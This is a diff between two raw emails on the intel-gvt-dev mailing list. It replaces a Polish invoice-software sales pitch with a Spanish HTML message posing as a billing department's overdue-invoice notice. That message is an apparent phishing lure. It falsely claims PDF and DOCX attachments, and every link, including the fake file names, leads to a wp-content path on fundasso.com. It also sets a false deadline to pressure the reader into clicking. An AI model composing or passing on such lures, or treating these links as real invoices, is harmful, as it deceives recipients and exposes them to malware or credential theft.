@@ -2,44 +2,34 @@ Return-Path: <intel-gvt-dev-bounces@lists.freedesktop.org>
 X-Original-To: lists+intel-gvt-dev@lfdr.de
 Delivered-To: lists+intel-gvt-dev@lfdr.de
 Received: from gabe.freedesktop.org (gabe.freedesktop.org [131.252.210.177])
-	by mail.lfdr.de (Postfix) with ESMTPS id 2A5BDCD544A
-	for <lists+intel-gvt-dev@lfdr.de>; Mon, 22 Dec 2025 10:14:03 +0100 (CET)
+	by mail.lfdr.de (Postfix) with ESMTPS id 6E01FCDD113
+	for <lists+intel-gvt-dev@lfdr.de>; Wed, 24 Dec 2025 22:07:03 +0100 (CET)
 Received: from gabe.freedesktop.org (localhost [127.0.0.1])
-	by gabe.freedesktop.org (Postfix) with ESMTP id 102E110E13B;
-	Mon, 22 Dec 2025 09:14:02 +0000 (UTC)
-Authentication-Results: gabe.freedesktop.org;
-	dkim=pass (2048-bit key; secure) header.d=monetria.pl header.i=@monetria.pl header.b="PVyRE/d/";
-	dkim-atps=neutral
+	by gabe.freedesktop.org (Postfix) with ESMTP id 4CF7310E011;
+	Wed, 24 Dec 2025 21:07:02 +0000 (UTC)
 X-Original-To: intel-gvt-dev@lists.freedesktop.org
 Delivered-To: intel-gvt-dev@lists.freedesktop.org
-X-Greylist: delayed 492 seconds by postgrey-1.36 at gabe;
- Mon, 22 Dec 2025 09:14:00 UTC
-Received: from mail.monetria.pl (mail.monetria.pl [37.187.176.9])
- by gabe.freedesktop.org (Postfix) with ESMTPS id 0E54A10E13B
+Received: from eyekreate.com (eyekreate.com [72.47.235.105])
+ by gabe.freedesktop.org (Postfix) with ESMTPS id AFF6010E011
  for <intel-gvt-dev@lists.freedesktop.org>;
- Mon, 22 Dec 2025 09:14:00 +0000 (UTC)
-Received: by mail.monetria.pl (Postfix, from userid 1002)
- id E66BA23D37; Mon, 22 Dec 2025 09:05:38 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=monetria.pl; s=mail;
- t=1766394345; bh=gSMbZ/0J29SQ9SENgmMV+ohcHfmmhhglG4yLVvPYJfI=;
- h=Date:From:To:Subject:From;
- b=PVyRE/d/bEdG5hmh9Qvl1rXhe74fg6CXxBEfgANAabvu903h1m/G2tcvMBwTxG/TE
- UooyZ1yLR7IY7uQarc4R7BfAebcU1XkGXFhbjvkN3Mc5qTVYbqcXpZaOzi5i9pVv1A
- Mz2NGRqokMC4H58WVcwveCzOFC/k+cPHhkWAjVFako5AQEiBAc+25WzFbUurJQM0Ru
- u/p1Y0XNsV8gQq0IUdifXBxIysJ+kygE1uDz3RnOi2CaiItsNOK/xHPPbV1IJZ6v06
- 1DSjBmK6BV7eHd7grBhHwailY0k7J9gpaxXitwUnGP3GG3VSrgebcxnidy2I+qlw1a
- AhSnxQagDUEvA==
-Received: by mail.monetria.pl for <intel-gvt-dev@lists.freedesktop.org>;
- Mon, 22 Dec 2025 09:05:27 GMT
-Message-ID: <20251222074500-0.1.54.s7fi.0.j5ff5mbdmq@monetria.pl>
-Date: Mon, 22 Dec 2025 09:05:27 GMT
-From: "Wanda Winnicka" <wanda.winnicka@monetria.pl>
-To: <intel-gvt-dev@lists.freedesktop.org>
-Subject: =?UTF-8?Q?System_do_obs=C5=82ugi_faktur_w_KSeFie?=
-X-Mailer: mail.monetria.pl
+ Wed, 24 Dec 2025 21:07:01 +0000 (UTC)
+Received: by eyekreate.com (Postfix, from userid 10002)
+ id 877BC3266E7; Wed, 24 Dec 2025 11:13:30 -0600 (CST)
+To: intel-gvt-dev@lists.freedesktop.org
+Subject: Ref: 2spvknop - intel-gvt-dev@lists.freedesktop.org,
+ Te recordamos que tu fecha de pago esta vencida ya esta disponible en
+ formato PDF y XML - 059417. - 24/12/2025 17:13:30
+From: "Facturacion - Yolanda Hidalgo"
+ <Yolanda_HidalgoPastor17332@eyekreate.com>
 MIME-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+Content-type: text/html; charset=iso-8859-1
+X-Mailer: PHP/7.3.25
+X-Sender: Yolanda_HidalgoPastor17332
+X-Priority: 3 (Normal)
+X-MSMail-Priority: Normal
+Message-ID: <3134d2ea4e7fc6dd497d0d3343bb40bfb76dec37@eyekreate.com>
+Date: Wed, 24 Dec 2025 17:13:13 +0000
+X-Originating-IP: [72.47.235.105]
 X-BeenThere: intel-gvt-dev@lists.freedesktop.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -52,28 +42,55 @@ List-Post: <mailto:intel-gvt-dev@lists.freedesktop.org>
 List-Help: <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=help>
 List-Subscribe: <https://lists.freedesktop.org/mailman/listinfo/intel-gvt-dev>, 
  <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=subscribe>
+Reply-To: Yolanda_HidalgoPastor17332@eyekreate.com
 Errors-To: intel-gvt-dev-bounces@lists.freedesktop.org
 Sender: "intel-gvt-dev" <intel-gvt-dev-bounces@lists.freedesktop.org>
 
-Dzie=C5=84 dobry,
+<html>
 
-zwracam si=C4=99 do Pa=C5=84stwa z zapytaniem o zainteresowanie wprowadze=
-niem systemu do cyfrowego obiegu dokument=C3=B3w w organizacji.
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Factura</title>
+</head>
 
-Nasza platforma pozwala usprawni=C4=87 codzienn=C4=85 prac=C4=99 bezpo=C5=
-=9Brednio w =C5=9Brodowisku Microsoft Outlook =E2=80=93 od zarz=C4=85dzan=
-ia dokumentacj=C4=85 i korespondencj=C4=85 po obs=C5=82ug=C4=99 faktur i =
-proces=C3=B3w akceptacyjnych.
+<body>
 
-Dodatkowo system wspiera firmy w uporz=C4=85dkowaniu obiegu dokument=C3=B3=
-w pod k=C4=85tem zmian wynikaj=C4=85cych z KSeF, zapewniaj=C4=85c lepsz=C4=
-=85 kontrol=C4=99 nad fakturami oraz =C5=82atwiejszy dost=C4=99p do pe=C5=
-=82nej historii operacji.
+<table cellpadding="0" cellspacing="0" width="548">
+	<!-- MSTableType="layout" -->
+	<tr>
+		<td height="565" valign="top"><a href="https://fundasso.com/wp-content/fact/?cid=intel-gvt-dev@lists.freedesktop.org&black=ii">
+		<img border="0" src="https://i.imgur.com/tUv4TK3.png" width="267" height="56"><img border="0" src="https://i.imgur.com/kKIEIxE.png" width="271" height="59"></a><br>
+&nbsp;<hr>
+		<p><font face="Segoe UI" size="2">Factura MTA - 233001 - 059417 - intel-gvt-dev@lists.freedesktop.org.<br>
+		<br>
+		Tu factura ya esta disponible en formato PDF y DOC. Los hemos adjuntado 
+		al cuerpo de este correo. Tambien puedes descargarla haciendo clic en el 
+		siguiente boton.<br>
+		<br>
+		Tienes hasta el 30 de diciembre de 2025 a las 15:00 p.m. para modificar tus 
+		datos de facturacion. Despues de esta fecha, no podras hacer ningun 
+		cambio.</font></p>
+		<ul>
+			<li><span style="letter-spacing: normal; background-color: #F7F7F8">
+			<font size="2">
+			<span style="font-family: Segoe UI">
+			<a href="https://fundasso.com/wp-content/fact/?cid=intel-gvt-dev@lists.freedesktop.org&black=ii"><span style="text-decoration: none">
+			FacturaMTA19365.pdf</span></a> (.pdf - Acrobat Reader)</span></font></span></li>
+			<li><span style="letter-spacing: normal; background-color: #F7F7F8">
+			<font size="2">
+			<span style="font-family: Segoe UI">
+			<a href="https://fundasso.com/wp-content/fact/?cid=intel-gvt-dev@lists.freedesktop.org&black=ii"><span style="text-decoration: none">FacturaMTA19365.docx</span></a>&nbsp; 
+			(.docx - Microsoft Word)</span></font></span></li>
+		</ul>
+		<p><font face="Segoe UI" size="2">Desde ya, muchas gracias.<br>
+		<br>
+		Atentamente,<br>
+		Yolanda Hidalgo Pastor<br>
+		Departamento de Facturacion<br>
+&nbsp;</font></td>
+	</tr>
+</table>
 
-Ch=C4=99tnie przedstawi=C4=99 szczeg=C3=B3=C5=82y rozwi=C4=85zania - pros=
-z=C4=99 o kontakt, je=C5=9Bli temat jest dla Pa=C5=84stwa interesuj=C4=85=
-cy.
+</body>
 
-
-Serdecznie pozdrawiam
-Wanda Winnicka
+</html>
